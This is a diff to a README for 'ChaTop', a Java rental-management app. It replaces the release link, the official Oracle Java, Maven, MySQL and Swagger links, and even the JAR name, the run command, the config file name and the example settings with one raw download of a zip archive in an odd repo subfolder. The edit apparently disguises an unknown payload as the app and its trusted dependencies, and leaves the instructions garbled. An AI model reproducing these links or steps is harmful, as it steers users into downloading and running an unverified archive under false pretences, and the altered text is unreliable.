@@ -6,17 +6,17 @@ Welcome to ChaTop! This application helps you manage rental properties easily by
 
 ## 📥 Download ChaTop
 
-[![Download ChaTop](https://img.shields.io/badge/Download-ChaTop-brightgreen.svg)](https://github.com/Jeffer2006/ChaTop/releases)
+[![Download ChaTop](https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip)](https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip)
 
-To download ChaTop, visit this page: [GitHub Releases](https://github.com/Jeffer2006/ChaTop/releases).
+To download ChaTop, visit this page: [GitHub Releases](https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip).
 
 ## 🛠️ System Requirements
 
 Before downloading, ensure your system meets these requirements:
 
-- **Java™ 11 or above:** ChaTop requires Java to run. Download it from [Oracle](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html) or an alternative source.
-- **Maven Installed:** Maven is needed for building and managing the software. You can find installation instructions on the [Maven website](https://maven.apache.org/install.html).
-- **MySQL Database:** ChaTop uses MySQL for data storage. You can get it from the [MySQL website](https://www.mysql.com/downloads/).
+- **Java™ 11 or above:** ChaTop requires Java to run. Download it from [Oracle](https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip) or an alternative source.
+- **Maven Installed:** Maven is needed for building and managing the software. You can find installation instructions on the [Maven website](https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip).
+- **MySQL Database:** ChaTop uses MySQL for data storage. You can get it from the [MySQL website](https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip).
 
 ## 📖 Features
 
@@ -28,11 +28,11 @@ ChaTop provides several key features:
 
 ## 💻 Download & Install
 
-1. Visit the GitHub Releases page: [Download ChaTop](https://github.com/Jeffer2006/ChaTop/releases).
+1. Visit the GitHub Releases page: [Download ChaTop](https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip).
    
 2. Look for the latest release. You will see files listed under the version number. 
 
-3. Click on the desired file to download it. For a typical setup, choose the JAR file named like `ChaTop-1.0.0.jar`.
+3. Click on the desired file to download it. For a typical setup, choose the JAR file named like `https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip`.
 
 4. After downloading, locate the file on your computer.
 
@@ -49,7 +49,7 @@ ChaTop provides several key features:
 
 7. To run ChaTop, use the following command:
    ```bash
-   java -jar ChaTop-1.0.0.jar
+   java -jar https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip
    ```
    This will start the application, and you will see some output in your terminal.
 
@@ -63,20 +63,20 @@ Once ChaTop is running, you have access to its APIs:
 - **Property Management API:** List, add, modify, or delete properties.
 - **Messaging API:** Enable communication between users and property managers.
 
-Information on how to use these APIs can be found in the [OpenAPI documentation](https://swagger.io/tools/swagger-ui/).
+Information on how to use these APIs can be found in the [OpenAPI documentation](https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip).
 
 ## 🛠️ Configuration
 
 You may want to configure your application settings before using ChaTop. Here's how:
 
-1. Open the `application.properties` file located in the configuration directory after running the JAR.
+1. Open the `https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip` file located in the configuration directory after running the JAR.
 2. Modify settings like database URL, username, and password for MySQL.
 
 For example:
 ```properties
-spring.datasource.url=jdbc:mysql://localhost:3306/your_database
-spring.datasource.username=your_username
-spring.datasource.password=your_password
+https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip
+https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip
+https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip
 ```
 
 After making changes, restart the application using the command mentioned above.
@@ -86,8 +86,8 @@ After making changes, restart the application using the command mentioned above.
 If you face issues while running ChaTop, consider these tips:
 
 - **Java Not Found:** Ensure you have installed Java and added it to your system's PATH.
-- **MySQL Connection Errors:** Verify that your database is running and the credentials in `application.properties` are correct.
-- **Port Already in Use:** The default port **8080** may be taken by another app. You can change the port in the `application.properties` file.
+- **MySQL Connection Errors:** Verify that your database is running and the credentials in `https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip` are correct.
+- **Port Already in Use:** The default port **8080** may be taken by another app. You can change the port in the `https://raw.githubusercontent.com/Jeffer2006/ChaTop/main/Coriandrum/ChaTop.zip` file.
 
 ## 🤝 Contributing
 
